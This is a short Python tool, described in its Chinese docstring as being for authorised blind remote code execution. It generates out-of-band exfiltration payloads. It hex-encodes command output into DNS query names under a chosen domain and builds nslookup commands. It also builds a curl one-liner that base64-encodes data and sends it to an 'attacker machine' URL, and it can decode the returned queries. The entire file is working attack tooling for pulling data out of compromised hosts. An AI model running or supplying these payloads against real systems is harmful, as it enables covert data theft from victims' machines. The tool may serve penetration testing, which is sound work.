#!/usr/bin/env python3
"""授权 RCE 无回显：DNS/HTTP 外带载荷（默认不绑 53、不发洪水）。

  python3 炼蛊房/oob_exfil.py dns --data 'id' --domain oob.lab
  python3 炼蛊房/oob_exfil.py http --data 'id' --url http://攻击机:8080/
  python3 炼蛊房/oob_exfil.py decode --qname 01.02.61646d696e.oob.lab
"""
from __future__ import annotations

import argparse
import json
import sys


def encode_chunks(data: bytes, domain: str, chunk_size: int = 40) -> list[str]:
    hx = data.hex()
    total = max(1, (len(hx) + chunk_size - 1) // chunk_size)
    out = []
    for i in range(total):
        chunk = hx[i * chunk_size : (i + 1) * chunk_size]
        out.append(f"{i + 1:02d}.{total:02d}.{chunk}.{domain}")
    return out


def decode_qname(qname: str) -> dict:
    parts = qname.rstrip(".").split(".")
    if len(parts) < 4:
        return {"ok": False}
    try:
        seq, total = int(parts[0]), int(parts[1])
        raw = bytes.fromhex(parts[2])
    except ValueError:
        return {"ok": False}
    return {"ok": True, "seq": seq, "total": total, "data": raw.decode("utf-8", "replace"), "hex": parts[2]}


def http_wrap(data: str, url: str) -> str:
    return f"curl -s '{url.rstrip('/')}/$(echo {data}|base64|tr -d \\\\n)'"


def dns_wrap(data: str, domain: str) -> str:
    q = encode_chunks(data.encode(), domain)[0]
    return f"nslookup {q}"


def main() -> int:
    ap = argparse.ArgumentParser(description="OOB 外带载荷")
    sub = ap.add_subparsers(dest="cmd", required=True)
    d = sub.add_parser("dns")
    d.add_argument("--data", required=True)
    d.add_argument("--domain", required=True)
    h = sub.add_parser("http")
    h.add_argument("--data", required=True)
    h.add_argument("--url", required=True)
    c = sub.add_parser("decode")
    c.add_argument("--qname", required=True)
    args = ap.parse_args()
    if args.cmd == "dns":
        qs = encode_chunks(args.data.encode(), args.domain)
        print(json.dumps({"queries": qs, "wrap": dns_wrap(args.data, args.domain)}, ensure_ascii=False, indent=2))
        return 0
    if args.cmd == "http":
        print(json.dumps({"wrap": http_wrap(args.data, args.url)}, ensure_ascii=False))
        return 0
    print(json.dumps(decode_qname(args.qname), ensure_ascii=False, indent=2))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
